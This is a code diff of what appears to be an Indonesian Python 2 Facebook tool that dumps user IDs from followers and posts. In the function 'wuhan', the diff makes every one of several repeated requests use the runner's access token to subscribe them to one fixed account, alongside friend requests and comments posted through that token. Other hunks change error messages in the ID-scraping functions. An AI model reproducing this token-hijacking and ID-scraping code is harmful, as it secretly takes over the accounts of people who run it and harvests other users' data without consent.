@@ -230,7 +230,7 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
@@ -324,7 +324,7 @@ def followers(kontol):
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ah)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan dolanmu kurang adoh.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # dump id dari followers hehe
@@ -353,7 +353,7 @@ def followers(kontol):
         raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
     except (KeyError,IOError):
         os.remove(ah)
-        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
+        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan dolanmu kurang adoh.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
 
 # dump id dari postingan hehe
